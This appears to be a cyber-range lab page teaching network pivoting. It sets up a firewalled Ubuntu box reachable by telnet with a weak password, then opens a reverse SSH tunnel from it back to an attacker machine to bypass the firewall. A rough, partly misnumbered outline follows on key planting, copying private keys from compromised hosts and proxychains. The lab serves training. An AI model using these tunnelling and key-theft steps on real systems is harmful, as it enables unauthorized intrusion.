---
layout: default
title: Portalord
---

# Portalord    

**Focus**: Multi-plexing

**Skill**: Remote ssh, key-exchange, localhost chaining

**Activity**: Develop pathways to machines inaccesible from your host machine  

<div style="text-align: center;">
  <img src="{{ 'classes/Portalord/portalord_banner_v2.png' | relative_url }}" alt="Portalord Logo" style="max-width: 80%; height: auto;">
</div>

---
# 1 remote ssh
Use remote ssh to connect back to a localhost and get around ufw rules set up in the environment. This is helpful when firewall rules do not allow access to port 22 from the outside.


### On the ssh-closed-box (ubuntu)
Set up the ufw wirewalls to block all traffic to port 22
<div class="scroll-box">
sudo ufw deny 22
sudo ufw allow 23
sudo ufw enable
</div> 

Turn password authentication on for the ssh-closed-box.
#### `sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh`

Create a file that is only accessable to an ssh session by setting a "read only by owner" 
<div class="scroll-box">
echo "insert a flag here" > /home/ubuntu/ssh_flag.txt
chmod 600 /home/ubuntu/ssh_flag.txt
</div> 
chmod permissions: Read (r=4), Write (w=2), Execute (x=1)

first int is the owner

second int is the group

third int is others

so 600 = 4+2 for the owner and 0 for group and 0 for everyone else

Create a user that can only access telnet specific files
#### `sudo adduser teluser`
- select a simple password (123)

set limited permissions for teluser
#### `sudo nano /usr/local/bin/telnet_shell.sh`
<div class="scroll-box">
#!/bin/bash
echo "You have limited access."
echo "You may only use: ls, cat"
export PATH=/usr/bin
exec /bin/bash --restricted
</div> 

install and open telnet services
<div class="scroll-box">
sudo apt update && sudo apt install telnetd -y && sudo apt install openbsd-inetd -y
</div> 

### On the attacker-box
Install telnet if needed:
<div class="scroll-box">
sudo apt update && sudo apt install telnet -y
</div>   

Turn on your ability to reverse ssh with a password:
#### `sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh`

now telnet into the ssh-closed-box
#### `telnet x.x.x.x`

now bind a local high port to local 22

ssh -N -R 2222:localhost:22 kali@your.kali.ip.addr.

-N means --no-shell, -R means:--remote-port-forward

If it appears to "hang" you have an open connection

Now from a differnt terminal on you kali localhost
####'ssh -p2222 ubuntu@ssh.closed.box.ip

go and find your flag

# 2 portbinding

2. using setting up portbinding from localhost to ssh devices eg. ssh ubuntu@10.15.15.10 > localhost:20000 localhost:20000 ssh ubuntu@10.15.15.11 >localhost:20001

# 3 wireshark
3. combining mkfifo wireshark capture to remote capture from chain ssh localhost:20001 "sudo tcpdump [flags]" /capturefifo

# 4a rsakey gen
4a. using an rsa keygen to allow for access to device (rsa-keygen) 

4b. sharing the private key with teammates so they can also get into the device rapidly (this is both effective teamwork on the range and shows the dangers of sharing a private key) 

5. using a device to "pivot" from with an rsa.pub key on other device w/o password eg- ssh ubuntu@10.15.15.10 ubuntu@cyber_range $ ssh ubuntu@10.15.15.16 5b. tunneling all the way to an end of a chain and placing your rsa_pub key in the appropriate place to gain direct access 

6. getting access to the rsa_key on a device you are ssh in and copying it to your device to have their level of accesses.
7.
8. 7. using proxychains4 to use local tools on remote networks.
